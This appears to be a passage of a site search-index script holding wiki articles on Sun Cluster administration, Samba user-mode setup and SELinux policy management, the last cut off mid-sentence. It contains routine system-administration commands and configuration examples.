clear all deleted LUNs and add all newly created LUNs in cluster DID configuration.\nNow create a zpool for each of your services. Once done, use them as filesystem resource:\nclrs create -g sun-rg -t SUNW.HAStoragePlus -p zpools=my_app1 my_app1-fs sun-rg: name of the resource group my_app1: zpool name my_app1-fs: filesystem cluster resource name Creating a GDS Resource linkA GDS is used to use custom scripts for starting, stopping or probing (status) an application. To integrate a GDS in an RG:\nclrs create -g sun-rg -t SUNW.gds -p Start_command=\"/bin/myscript.sh start\" -p Stop_command=\"/bin/myscript.sh stop\" -p Probe_command=\"/bin/myscript.sh status\" -p resource_dependencies=my_app-fs -p Network_aware=false my_app1-script This will create a GDS with your Zpool as dependency. This means it should be up before the start of the GDS.\nNote: You don’t need to put the VIP as resource dependency because Sun cluster does it for you by default.\nModify / view resource properties linkYou may need to change some properties or get information about them. To show them:\nclrs show -v my_resource And to set a property:\nclrs set -p my_property=value my_resource ex:\nclrs set -p START_TIMEOUT=60 ressource_gds clrs set -p Probe_command=\"/mnt/test/bin/service_cluster.pl status my_rg\" ressource_gds Activating Resource Group linkTo activate the RG:\nclrg manage sun-rg Now if you want to use it (this will activate all the resources in the RG):\nclrg online sun-rg You can also specify a node by adding -n:\nclrg online -n node1 sun-rg Maintenance linkBoot in non cluster mode linkReboot with command line linkIf you need to enter non-cluster mode, use this command:\nreboot -- -x Boot from grub linkSimply edit this line by adding -x at the end during server boot:\nkernel /platform/i86pc/multiboot -x Remove node from cluster linkSimply run this command:\nclnode remove FAQ linkCan’t integrate cluster linkSolution 1 linkDuring installation, if you get this kind of problem:\nWaiting for \"sun-node2\" to become a cluster member ... Please follow this step: Remove RPC and Webconsole binding\nSolution 2 linkRemove node configuration and retry.\nThe cluster is in installation mode linkIf at the end of the installation you encounter this kind of problem (a message like “The cluster is in installation mode” or “Le cluster est en mode installation”) this means you need to configure something before configuring your RG or RS.\nIf you have the WebUI (http://127.0.0.1:6789 for example), you might be able to resolve your problem with it. But in this case, if you may have installed the Quorum, you need to configure it as well.\nHow to change Private Interconnect IP for cluster? linkThe cluster install wanted to use a .0.0 as the private interconnect, and when installed, one private interconnect ended up on 172.16.0 and one ended up on 172.16.1, causing one private interconnect to fault. I found an article that indicated you could edit the cluster configuration by first booting each machine in non-cluster mode (boot-x, I actually did a reboot and then a stop A on the reboot and then a boot -x).\nEdit the file /etc/cluster/ccr/infrastructure and then incorporate your changes using:\n/usr/cluster/lib/sc/ccradm -o -i /etc/cluster/ccr/infrastructure After I modified the file to change both private interconnects to be on the 172.16.0 subnet, the second private interconnect came online. Once the second private interconnect came up, I was able to run scsetup, select an additional quorum drive and then set the cluster out of install mode.\nSome commands cannot be executed on a cluster in Install mode linkThis is generally the case in a 2-node cluster when Quorum is not already set. As described in the man page:\nSpecify the installation-mode setting for the cluster. You can specify either enabled or disabled for the installmode property. While the installmode property is enabled, nodes do not attempt to reset their quorum configurations at boot time. Also, while in this mode, many administrative functions are blocked. When you first install a cluster, the installmode property is enabled. After all nodes have joined the cluster for the first time, and shared quorum devices have been added to the configuration, you must explicitly disable the installmode property. When you disable the installmode property, the quorum vote counts are set to default values. If quorum is automatically configured during cluster creation, the installmode property is disabled as well after quorum has been configured. However, if you don’t want to add a quorum or would like to use it now, simply run this command:\ncluster set -p installmode=disabled Disk path offline linkDID number 3 corresponds to and is reserved for the disk array management and may be seen by the cluster. As it cannot be written (because disk arrays show it in read-only) by the cluster, it shows errors. However, these are not actual errors and you can carefully use your cluster.\nMethod 1 linkTo recover your DID as cleanly as possible, run this command on all the cluster nodes:\ndevfsadm Then if it’s the same on all nodes and only if it’s like that, you can safely run this command:\nscgdevs If you get errors like this, please use Method 2:\n$ scgdevs Configuring DID devices /usr/cluster/bin/scdidadm: Could not open \"/dev/rdsk/c0t0d0s2\" to verfiy device ID - Device busy. /usr/cluster/bin/scdidadm: Could not stat \"../../devices/scsi_vhci/disk@g600a0b80005634b400005a334accd4d9:c,raw\" - No such file or directory. Warning: Path node loaded - \"../../devices/scsi_vhci/disk@g600a0b80005634b400005a334accd4d9:c,raw\". Configuring the /dev/global directory (global devices) obtaining access to all attached disks Method 2 linkThis second method is manual. You can see a format WWN command ending with 31, ex:\n3 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B6000008304AC37A31d0 /dev/did/rdsk/d3 If you really want to disable these kinds of messages, connect to all nodes integrated in the cluster and run this command:\n$ scdidadm -C scdidadm: Unable to remove driver instance \"3\" - No such device or address. Updating shared devices on node 1 Updating shared devices on node 2 Updating shared devices on node 3 Updating shared devices on node 4 Updating shared devices on node 5 Updating shared devices on node 6 Now we can verify everything is ok:\n$ scdidadm -l 1 PA-TLH-SRV-PRD-1:/dev/rdsk/c0t0d0 /dev/did/rdsk/d1 2 PA-TLH-SRV-PRD-1:/dev/rdsk/c1t0d0 /dev/did/rdsk/d2 14 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B6000008304AC37AA3d0 /dev/did/rdsk/d14 15 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B40000594B4AC37A8Fd0 /dev/did/rdsk/d15 16 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B60000082E4AC37A6Ad0 /dev/did/rdsk/d16 17 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000059494AC37A5Dd0 /dev/did/rdsk/d17 18 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B60000082C4AC37A3Dd0 /dev/did/rdsk/d18 19 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000059474AC37A2Bd0 /dev/did/rdsk/d19 20 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B60000082A4AC37A07d0 /dev/did/rdsk/d20 21 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000059454AC379F8d0 /dev/did/rdsk/d21 22 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B800048A9B6000008284AC379B4d0 /dev/did/rdsk/d22 23 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000059434AC3799Ad0 /dev/did/rdsk/d23 24 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000058BF4AC1DF47d0 /dev/did/rdsk/d24 25 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000058BD4AC1DF32d0 /dev/did/rdsk/d25 26 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000058BB4AC1DF20d0 /dev/did/rdsk/d26 27 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000058B94AC1DF0Dd0 /dev/did/rdsk/d27 28 PA-TLH-SRV-PRD-1:/dev/rdsk/c4t600A0B80005634B4000007104A9D6B81d0 /dev/did/rdsk/d28 DID 3 is not present anymore. If you want to update everything:\n$ scdidadm -r Warning: DID instance \"3\" has been detected to support SCSI2 Reserve/Release protocol only. Adding path \"PA-TLH-SRV-PRD-3:/dev/rdsk/c3t202300A0B85634B4d31\" creates more than 2 paths to this device and can lead to unexpected node panics. DID subpath \"/dev/rdsk/c3t202300A0B85634B4d31s2\" created for instance \"3\". Warning: DID instance \"3\" has been detected to support SCSI2 Reserve/Release protocol only. Adding path \"PA-TLH-SRV-PRD-3:/dev/rdsk/c2t201200A0B85634B4d31\" creates more than 2 paths to this device and can lead to unexpected node panics. DID subpath \"/dev/rdsk/c2t201200A0B85634B4d31s2\" created for instance \"3\". Warning: DID instance \"3\" has been detected to support SCSI2 Reserve/Release protocol only. Adding path \"PA-TLH-SRV-PRD-3:/dev/rdsk/c3t202200A0B85634B4d31\" creates more than 2 paths to this device and can lead to unexpected node panics. DID subpath \"/dev/rdsk/c3t202200A0B85634B4d31s2\" created for instance \"3\". Warning: DID instance \"3\" has been detected to support SCSI2 Reserve/Release protocol only. Adding path \"PA-TLH-SRV-PRD-3:/dev/rdsk/c2t201300A0B85634B4d31\" creates more than 2 paths to this device and can lead to unexpected node panics. DID subpath \"/dev/rdsk/c2t201300A0B85634B4d31s2\" created for instance \"3\". Force uninstall linkThis is not recommended, but if you can’t uninstall and want to force it, here is the procedure:\nStop all cluster nodes (scshutdown -y -g 0) and start them again in non-cluster mode ok boot -x Remove the Sun Cluster packages pkgrm SUNWscu SUNWscr SUNWscdev SUNWscvm SUNWscsam SUNWscman SUNWscsal SUNWmdm Remove the configurations rm -r /var/cluster /usr/cluster /etc/cluster rm /etc/inet/ntp.conf rm -r /dev/did rm -r /devices/pseudo/did* rm /etc/path_to_inst (make sure you have backup copy of this file) ATTENTION: If you create a new path_to_inst at boottime with ‘boot -ra’ you should be on the physical boot device. It may not be possible to write a path_to_inst on a boot mirror (SVM or VxVM).\nEdit configuration files\nedit /etc/vfstab to remove did and global entries edit /etc/nsswitch.conf to remove cluster references Reboot the node with -a option (necessary to write a new path_to_inst file)\nreboot -- -rav reply “y” to “do you want to rebuild path_to_inst?”\nIn case of reinstalling, then… mkdir /globaldevices; rmdir /global Uncomment /globaldevices entry from /etc/vfstab newfs /dev/rdsk/c?t?d?s? (wherever /globaldevices was mounted) mount /globaldevices scinstall How to Change Sun Cluster Node Names linkMake a copy of /etc/cluster/ccr/infrastructure:\ncp /etc/cluster/ccr/infrastructure /etc/cluster/ccr/infrastructure.old Edit /etc/cluster/ccr/infrastructure and change node names as you want. For example, change srv01 to server01 and srv02 to server02.\nIf necessary, change the Solaris node name:\necho server01 \u003e /etc/nodename Regenerate the checksum for the infrastructure file:\n/usr/cluster/lib/sc/ccradm -i /etc/cluster/ccr/infrastructure -o Shut down Sun Cluster and boot both nodes:\ncluster shutdown -g 0 -y ok boot Can’t switch an RG from one node to another linkI had a problem switching an RG on a Solaris 10u7 with Sun Cluster 3.2u2 (installed patches: 126107-33, 137104-02, 142293-01, 141445-09). The ZFS volume wouldn’t mount on another node. In the /var/adm/messages file, I saw this message when trying to mount an RG:\nDec 16 15:34:30 LD-TLH-SRV-PRD-3 zfs: [ID 427000 kern.warning] WARNING: pool 'ulprod-ld_mysql' could not be loaded as it was last accessed by another system (host: LD-TLH-SRV-PRD-2 hostid: 0x27812152). See: http://www.sun.com/msg/ZFS-8000-EY In fact, it’s a bug that can be bypassed by putting the RG offline:\nclrg offline Then manually mount and unmount the zpool:\nzpool import zpool export Now put the RG online:\nclrg online -n If the problem still occurs, look in the log files and if you see something like this:\nAug 17 22:23:28 minipardus SC[,SUNW.HAStoragePlus:8,clstorage,zfspool,hastorageplus_prenet_start]: [ID 148650 daemon.notice] Started searching for devices in '/dev/dsk' to find the importable pools. Aug 17 22:23:35 minipardus SC[,SUNW.HAStoragePlus:8,clstorage,zfspool,hastorageplus_prenet_start]: [ID 547433 daemon.notice] Completed searching the devices in '/dev/dsk' to find the importable pools. Aug 17 22:23:35 minipardus SC[,SUNW.HAStoragePlus:8,clstorage,zfspool,hastorageplus_prenet_start]: [ID 471757 daemon.error] cannot import pool 'qnap': '/var/cluster/run/HAStoragePlus/zfs' is not a valid directory Aug 17 22:23:35 minipardus SC[,SUNW.HAStoragePlus:8,clstorage,zfspool,hastorageplus_prenet_start]: [ID 117328 daemon.error] The pool 'qnap' failed to import and populate cachefile. Aug 17 22:23:35 minipardus SC[,SUNW.HAStoragePlus:8,clstorage,zfspool,hastorageplus_prenet_start]: [ID 292307 daemon.error] Failed to import:qnap If that’s the case, it’s apparently fixed in Sun Cluster 3.2u3.\nTo avoid installing this update, create this folder ‘/var/cluster/run/HAStoragePlus/zfs’:\nmkdir -p /var/cluster/run/HAStoragePlus/zfs Check if file “/etc/cluster/eventlog/eventlog.conf” contains the line “EC_zfs - - - /usr/cluster/lib/sc/events/zpool_cachefile_plugin.so”.\nIf it’s not the case, the content should look like:\n# Class Subclass Vendor Publisher Plugin location Plugin parameters EC_Cluster - - - /usr/cluster/lib/sc/events/default_plugin.so EC_Cluster - - gds /usr/cluster/lib/sc/events/gds_plugin.so EC_Cluster - - - /usr/cluster/lib/sc/events/commandlog_plugin.so EC_zfs - - - /usr/cluster/lib/sc/events/zpool_cachefile_plugin.so Now mount the RG where you want, it should work.\nCluster is unavailable when a node crashes on a 2-node cluster linkTwo types of problems can arise from cluster partitions: split brain and amnesia. Split brain occurs when the cluster interconnect between Solaris hosts is lost and the cluster becomes partitioned into subclusters, and each subcluster believes that it is the only partition. A subcluster that is not aware of the other subclusters could cause a conflict in shared resources, such as duplicate network addresses and data corruption.\nAmnesia occurs if all the nodes leave the cluster in staggered groups. An example is a two-node cluster with nodes A and B. If node A goes down, the configuration data in the CCR is updated on node B only, and not node A. If node B goes down at a later time, and if node A is rebooted, node A will be running with old contents of the CCR. This state is called amnesia and might lead to running a cluster with stale configuration information.\nYou can avoid split brain and amnesia by giving each node one vote and mandating a majority of votes for an operational cluster. A partition with the majority of votes has a quorum and is enabled to operate. This majority vote mechanism works well if more than two nodes are in the cluster. In a two-node cluster, a majority is two. If such a cluster becomes partitioned, an external vote enables a partition to gain quorum. This external vote is provided by a quorum device. A quorum device can be any disk that is shared between the two nodes.\nRecovering from amnesia linkScenario: Two node cluster (nodes A and B) with one Quorum Device, nodeA has gone bad, and amnesia protection is preventing nodeB from booting up.\nAmnesia occurs if all the nodes leave the cluster in staggered groups. An example is a two-node cluster with nodes A and B. If node A goes down, the configuration data in the CCR is updated on node B only, and not node A. If node B goes down at a later time, and if node A is rebooted, node A will be running with old contents of the CCR. This state is called amnesia and might lead to running a cluster with stale configuration information.\nWarning: this is a dangerous operation\nBoot nodeB in non-cluster mode: reboot -- -x Edit nodeB’s file /etc/cluster/ccr/global/infrastructure as follows: Change the value of “cluster.properties.installmode” from “disabled” to “enabled” Change the number of votes for nodeA from “1” to “0”, in the property line “cluster.nodes..properties.quorum_vote”. Delete all lines with “cluster.quorum_devices” to remove knowledge of the quorum device. ... cluster.properties.installmode enabled ... cluster.nodes.1.properties.quorum_vote 1 ... On the first node (the master one, the first to boot) run: /usr/cluster/lib/sc/ccradm -i /etc/cluster/ccr/infrastructure -o or (depending on version)\n/usr/cluster/lib/sc/ccradm recover -o /etc/cluster/ccr/global/infrastructure Reboot nodeB in cluster mode: reboot If you have more than 2 nodes, use the same command but without “-o”:\n/usr/cluster/lib/sc/ccradm recover /etc/cluster/ccr/global/infrastructure References linkInstallation of Sun Cluster (old) https://en.wikipedia.org/wiki/Solaris_Cluster\nhttps://opensolaris.org/os/community/ha-clusters/translations/french/relnote_fr/\nResources Properties\nhttps://docs.sun.com/app/docs/doc/819-0177/cbbbgfij?l=ja\u0026a=view\nhttps://www.vigilanttechnologycorp.com/genasys/weblogRender.jsp?LogName=Sun%20Cluster\nhttps://docs.sun.com/app/docs/doc/820-2558/gdrna?l=fr\u0026a=view\nhttps://wikis.sun.com/display/SunCluster/%28English%29+Sun+Cluster+3.2+1-09+Release+Notes#%28English%29SunCluster3.21-09ReleaseNotes-optgdfsinfo (Gold Mine)\nDeploying highly available zones with Solaris Cluster 3.2\n"
            }
        );
    index.add(
            {
                id:  380 ,
                href: "\/Installation_et_configuration_de_Samba_en_mode_%22User%22\/",
                title: "Installation and Configuration of Samba in 'User' Mode",
                description: "A guide for setting up Samba in user mode to share folders with Windows and Unix systems securely",
                content: "Introduction linkSamba is a free software licensed under the GPL that supports the SMB/CIFS protocol. This protocol is used by Microsoft for sharing various resources (files, printers, etc.) between computers running Windows. Samba allows Unix systems to access resources from these systems and vice versa.\nPreviously, PCs with DOS and early versions of Windows sometimes needed to install a TCP/IP stack and a set of Unix applications: an NFS client, FTP, telnet, lpr, etc. This was cumbersome and penalizing for PCs of that time, and it also forced users to adopt two sets of habits, adding those of UNIX to those of Windows. Samba therefore adopts the opposite approach.\nIts name comes from the file and print sharing protocol from IBM and reused by Microsoft called SMB (Server message block), to which two vowels “a” were added: “SaMBa”.\nSamba was originally developed by Andrew Tridgell in 1991 and now receives contributions from about twenty developers from around the world under his coordination. He gave it this name by choosing a name close to SMB by querying a Unix dictionary with the command grep: grep \"^s.*m.*b\" /usr/dict/words\nWhen both file sharing systems (NFS, Samba) are installed for comparison, Samba proves less efficient than NFS in terms of transfer rates.\nNevertheless, a study showed that Samba 3 was up to 2.5 times faster than Windows Server 2003’s SMB implementation. See the information on LinuxFr.\nHowever, Samba is not compatible with IPv6.\nThe “User” mode allows you to share folders simply by user. You then need a login and a password. This is a sufficiently secure solution for small businesses.\nInstallation linkDebian linkTo install Samba:\naptitude install samba FreeBSD linkFor FreeBSD:\npkg_add -r samba34 Configuration linkTo configure Samba, edit the file /etc/samba/smb.conf (/usr/local/etc/smb.conf under FreeBSD):\n#======================= Global Settings ===================================== [global] # Samba server name server string = Samba # Socket optimization socket options = TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192 # Workgroup name workgroup = workgroup # Samba server level os level = 20 ## Restrictions ## # Deny everyone hosts deny = ALL # Allow only requests from these IPs hosts allow = 192.168.0.0/255.255.255.0 127.0.0.1 10.8.0.0/255.255.255.0 bind interfaces only = yes # Allow only requests from this network interface interfaces = eth0 ## Encoding ## European display with accents dos charset = 850 display charset = UTF8 ## Name resolution ## Name resolutions dns proxy = no wins support = no name resolve order = lmhosts host wins bcast ## Logs ## max log size = 50 log file = /var/log/samba/%m.log syslog only = no syslog = 0 panic action = /usr/share/samba/panic-action %d ## Passwords ## # User mode security = user encrypt passwords = true unix password sync = no passwd program = /usr/bin/passwd %u passwd chat = *Enter\\snew\\sUNIX\\spassword:* %n\\n *Retype\\snew\\sUNIX\\spassword:* %n\\n . # Do not allow these users invalid users = root ## Restrictions ## # Hide special files hide special files = no # Hide unreadable files hide unreadable = no # Hide hidden files (starting with a \".\") hide dot files = no ## Resolve office save problems ## # Solves compatibility issues with versions \u003e MS Office 2002 oplocks = no #======================= Shares ============================================== [Homes] comment = Home Directories browseable = yes # Allows browsing a directory tree read only = no # No read-only writable = yes # Allows writing create mask = 0700 # File creation rights directory mask = 0700 # Directory creation rights veto files = /.DS_Store/.fuse_*/ # Do not display objects: \".DS_Store\" and \".fuse_*\" [Sauvegardes] comment = Sauvegardes path = /saves # Shared folder browseable = yes writable = yes validusers = deimos, @smbusers # Authorized users. To define a group, start with \"@\" veto files = /.DS_Store/.fuse_*/ [Share2] comment = Sauvegardes path = /share # I only allow authenticated access guest ok = no # Everyone can read read only = yes # But only my smbusers group can write write list = @smbusers Some explanations:\nFirst configure the data in Global Set the OS level \u003c 20 unless it acts as a domain controller, then \u003e 50 Adapt all this to your configuration. Then restart Samba:\n/etc/init.d/samba restart Or like this under FreeBSD:\n/usr/local/etc/rc.d/samba restart Now, you need to add users! It’s quite simple, but it’s the kind of thing you often forget:\nsmbpasswd -a deimos This will add my user deimos. And here is the list of possible options:\nsmbpasswd --help When run by root: smbpasswd [options] [username] otherwise: smbpasswd [options] options: -L local mode (must be first option) -h print this usage message -s use stdin for password prompt -c smb.conf file Use the given path to the smb.conf file -D LEVEL debug level -r MACHINE remote machine -U USER remote username extra options when run by root or in local mode: -a add user -d disable user -e enable user -i interdomain trust account -m machine trust account -n set no password -W use stdin ldap admin password -w PASSWORD ldap admin password -x delete user -R ORDER name resolve order Under FreeBSD, you can find the file containing the list of authorized users in /usr/local/etc/samba34.\nFor FreeBSD still, if you want Samba to start automatically at boot:\necho 'samba_enable=\"YES\"' \u003e\u003e /etc/rc.conf.local Connection linkWindows linkTo connect from Windows, in a link window, type this:\n\\\\IP_of_samba_server\\Share_name You will access the share directly.\nUnix (Linux/Mac…) linkYou must have smbfs installed before continuing:\naptitude install smbfs Then, simply create a folder and mount the share in it:\nmkdir saves mount -t cifs -o username=user,password=password //192.168.0.1/saves ./saves FAQ linkTest your configuration linkIf you have some problems, here is a way to check your configuration (FreeBSD):\n/usr/local/bin/testparm -s Unable to connect to CUPS server localhost:631 - Connection refused linkIf you don’t use a CUPS print server, then make the following changes to disable it and allow Samba to start:\n# Disable printers load printers = no show add printer wizard = no printing = none printcap name = /dev/null disable spoolss = yes Migrate your smbpasswd file to tdbsam linkIt is possible that when updating your Samba, your smbpasswd file no longer works and must be replaced by a tdbsam. All your users will then no longer work. The easiest way is to convert all your old accounts to this new format:\ncd /etc/samba pdbedit -i smbpasswd -e tdbsam You may need to modify your samba configuration file to add this:\npassdb backend = tdbsam:/var/lib/samba/passdb.tdb Resources linkIf you want to push folder permissions, check the documentation on ACL: Implementation of NT-type rights.\nOther documentation on Samba\nCIFS Solaris Workgroup\nhttp://www.csua.berkeley.edu/~ranga/notes/freebsd_samba.html+samba+freebsd\u0026cd=6\u0026hl=fr\u0026ct=clnk\u0026client=ubuntu\nhttp://www.tobanet.de/dokuwiki/samba:upgrade\n"
            }
        );
    index.add(
            {
                id:  381 ,
                href: "\/Securiser_son_architecture_avec_SELinux\/",
                title: "Secure Your Architecture with SELinux",
                description: "A comprehensive guide to understanding and implementing SELinux security policies in Linux systems",
                content: "Introduction linkSecurity-Enhanced Linux, abbreviated as SELinux, is a LSM (Linux security module) that allows defining a MAC (mandatory access control) access policy to elements of a Linux-based system. Initiated by the NSA based on work conducted with SCC and the University of Utah in the USA (DTMach prototypes, DTOS, FLASK project), its architecture separates policy enforcement from its definition. It notably allows classifying applications of a system into different groups with finer access levels. It also allows assigning a confidentiality level for accessing system objects, such as file descriptors, according to an MLS (Multi Level Security) security model. SELinux uses the Bell LaPadula model with SCC Type enforcement for integrity. It is free software, with some parts licensed under GNU GPL or BSD.\nIn practice, the innovation is based on defining extended attributes in the UNIX filesystem. Beyond the concept of “read, write, execute rights” for a given user, SELinux defines for each file or process:\nA virtual user (or collection of roles); A role; A security context. Usage linkDefining the Mode linkThis is where you define the SELinux mode and its type. We’ll use the targeted mode which is single-user mode (no one above root). The mls mode is equivalent to RBAC which allows many more security groups and users (for very large companies):\n# This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. SELINUX=enforcing # SELINUXTYPE= can take one of these two values: # targeted - Targeted processes are protected, # mls - Multi Level Security protection. SELINUXTYPE=targeted Getting the Current Mode and Changing It linkFirst, we need to know in which mode we are:\n$ getenforce Enforcing Here we see I’m in enforcing mode. If I want to switch to permissive mode, I run this command with argument 0:\nsetenforce 0 And I set it to 1 to go back to enforcing mode.\nWe can verify that SELinux is properly enabled by listing processes. The SELinux attributes will display with the ‘Z’ argument:\n$ ps axZ | grep cron system_u:system_r:crond_t:s0-s0:c0.c1023 1417 ? Ss 0:00 crond system_u:system_r:crond_t:s0-s0:c0.c1023 1428 ? Ss 0:00 /usr/sbin/atd unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 2082 pts/0 S+ 0:00 grep cron We can also do this on folders or files:\n$ ls -Z /root -rw-------. root root system_u:object_r:admin_home_t:s0 anaconda-ks.cfg -rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log -rw-r--r--. root root system_u:object_r:admin_home_t:s0 install.log.syslog Disable Only One Domain linkYou also have the option to disable only one domain if desired. Let’s take Apache as an example:\nsemanage permissive -a httpd_t This service is now in permissive state.\nAnalyzing Blocks linkWhen SELinux decides to block certain access, there are several ways to analyze and accept certain false positives. First, there’s the ‘audit2allow’ command:\naudit2allow -la #============= httpd_t ============== allow httpd_t admin_home_t:file { read getattr open }; You also have logs that provide information about blocks in /var/log/audit/audit.log:\ntype=AVC msg=audit(1317855069.699:15772): avc: denied { getattr } for pid=2273 comm=\"httpd\" path=\"/var/www/html/mon_fichier.txt\" dev=dm-0 ino=30073 scontext=unconfined_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file type=SYSCALL msg=audit(1317855069.699:15772): arch=c000003e syscall=4 success=yes exit=0 a0=7f300213e3c8 a1=7ffffd59c590 a2=7ffffd59c590 a3=0 items=0 ppid=2268 pid=2273 auid=0 uid=48 gid=48 euid=48 suid=48 fsuid=48 egid=48 sgid=48 fsgid=48 tty=(none) ses=2 comm=\"httpd\" exe=\"/usr/sbin/httpd\" subj=unconfined_u:system_r:httpd_t:s0 key=(null) type=AVC msg=audit(1317855069.700:15773): avc: denied { read } for pid=2273 comm=\"httpd\" name=\"mon_fichier.txt\" dev=dm-0 ino=30073 scontext=unconfined_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file type=AVC msg=audit(1317855069.700:15773): avc: denied { open } for pid=2273 comm=\"httpd\" name=\"mon_fichier.txt\" dev=dm-0 ino=30073 scontext=unconfined_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file type=SYSCALL msg=audit(1317855069.700:15773): arch=c000003e syscall=2 success=yes exit=11 a0=7f300213e480 a1=80000 a2=0 a3=2 items=0 ppid=2268 pid=2273 auid=0 uid=48 gid=48 euid=48 suid=48 fsuid=48 egid=48 sgid=48 fsgid=48 tty=(none) ses=2 comm=\"httpd\" exe=\"/usr/sbin/httpd\" subj=unconfined_u:system_r:httpd_t:s0 key=(null) I can see here that a file named mon_fichier.txt was blocked for httpd_t because the object is not correct.\nThe Contexts linkAs you’ve seen, there are some special attributes called contexts. We can display this list of contexts via the ‘semanage’ command which allows us to manage contexts:\n$ semanage fcontext -l | more SELinux fcontext type Context / directory system_u:object_r:root_t:s0 /.* all files system_u:object_r:default_t:s0 /HOME_DIR/\\.Xdefaults all files system_u:object_r:config_home_t:s0 /HOME_DIR/\\.xine(/.*)? all files system_u:object_r:config_home_t:s0 /[^/]+ regular file system_u:object_r:etc_runtime_t:s0 /\\.autofsck regular file system_u:object_r:etc_runtime_t:s0 /\\.autorelabel regular file system_u:object_r:etc_runtime_t:s0 /\\.journal all files \u003c\u003e /\\.suspended regular file system_u:object_r:etc_runtime_t:s0 /a?quota\\.(user|group) regular file system_u:object_r:quota_db_t:s0 /afs directory system_u:object_r:mnt_t:s0 /bin directory system_u:object_r:bin_t:s0 /bin/.* all files system_u:object_r:bin_t:s0 /bin/alsaunmute regular file system_u:object_r:alsa_exec_t:s0 /bin/bash regular file system_u:object_r:shell_exec_t:s0 /bin/bash2 regular file system_u:object_r:shell_exec_t:s0 /bin/d?ash regular file system_u:object_r:shell_exec_t:s0 /bin/dbus-daemon regular file system_u:object_r:dbusd_exec_t:s0 /bin/dmesg regular file system_u:object_r:dmesg_exec_t:s0 /bin/fish regular file system_u:object_r:shell_exec_t:s0 /bin/fusermount regular file system_u:object_r:fusermount_exec_t:s0 ... Contexts match regexes and are authorized this way.\nContext Modification linkLet’s say for my website, I want to create an index file. I’m in /tmp and create my index. At that moment, when the file is created on disk, SELinux will tag the index file and specify that it belongs to the /tmp directory.\nSo when I move it to /var/www, it will still keep those attributes and the Apache server won’t be able to use this file. To fix the issue, I have 2 choices:\nRestore the rights defined in the context database for the parent directory. Reassign the correct rights to the specific file Context Restoration linkTo restore contexts, we’ll use the restcon command:\nrestcon -Rv /var/www And now we have reset all SELinux rights in /var/www.\nContext Reassignment linkTo reassign the correct rights, I need to apply the security policy to this file:\nchcon -v -t httpd_sys_content_t /var/www/index.html httpd_sys_content_t: this is the desired context type for the /var/www directory\nTo find the right context, use the semanage command as seen above:\n$ semanage fcontext -l | grep \"/var/www\" /var/www(/.*)? all files system_u:object_r:httpd_sys_content_t:s0 /var/www(/.*)?/logs(/.*)? all files system_u:object_r:httpd_log_t:s0 /var/www/[^/]*/cgi-bin(/.*)? all files system_u:object_r:httpd_sys_script_exec_t:s0 ... You can see in the last column that the context we’re looking for is “httpd_sys_content_t”.\nAdding a Context linkThis is something you should avoid doing to solve problems, but rather use to improve security or customize it for your needs. Here we’ll add a context to fix the problem with the file listed above that belongs to admin and is located in /var/www/html. We’ll add a context with the rights of the root directory:\nsemanage fcontext -a -t admin_home_t \"/var/www(/.*)?\" Then you can verify your changes:\n$ semanage fcontext -l | grep www /srv/([^/]*/)?www(/.*)? all files system_u:object_r:httpd_sys_content_t:s0 /usr/share/awstats/wwwroot(/.*)? all files system_u:object_r:httpd_awstats_content_t:s0 /usr/share/awstats/wwwroot/cgi-bin(/.*)? all files system_u:object_r:httpd_awstats_script_exec_t:s0 /var/www(/.*)? all files system_u:object_r:admin_home_t:s0 Now you just need to run “restcon” to fix the permissions.\nPort Blocking linkSELinux also allows only certain services to run on specific ports. Proof:\n$ semanage port -l | grep http http_cache_port_t tcp 3128, 8080, 8118, 10001-10010 http_cache_port_t udp 3130 http_port_t tcp 80, 443, 488, 8008, 8009, 8443 pegasus_http_port_t tcp 5988 pegasus_https_port_t tcp 5989 If you want to run Apache on another port, for example, you’ll need to add it to the contexts list:\nsemanage port -a -t http_port_t -p tcp 81 I chose port 81 in this example.\nBooleans linkBooleans are another type of blocking that SELinux implements, typically found on well-known services. To get this list:\n$ getsebool -a abrt_anon_write --\u003e off allow_console_login --\u003e on allow_corosync_rw_tmpfs --\u003e off allow_cvs_read_shadow --\u003e off allow_daemons_dump_core --\u003e on allow_daemons_use_tty --\u003e on allow_domain_fd_use --\u003e on allow_execheap --\u003e off allow_execmem --\u003e on allow_execmod --\u003e on allow_execstack --\u003e on allow_ftpd_anon_write --\u003e off allow_ftpd_full_access --\u003e off allow_ftpd_use_cifs --\u003e off ... To change a value, simply do:\nsetsebool allow_ftpd_full_access on You can verify afterwards in two ways:\n$ getsebool allow_ftpd_full_access or\n$ semanage boolean -l FAQ linkMy System Refuses to Boot Because of SELinux linkTo fix this problem, at the grub boot, edit the kernel line and add this at the end:\nenforcing=0 This will set permissive mode at machine boot so you can fix your problem.\nHow to Reapply All Security Policies to My System? linkIf you want to reset all your SELinux security policy on your machine, there are 2 solutions. The first is messier; it consists of checking and reapplying all changes on the fly:\nrestorecon -R / I told you… it’s ugly! However, another cleaner solution that will correctly reapply all permissions at the next reboot is to create a file at the 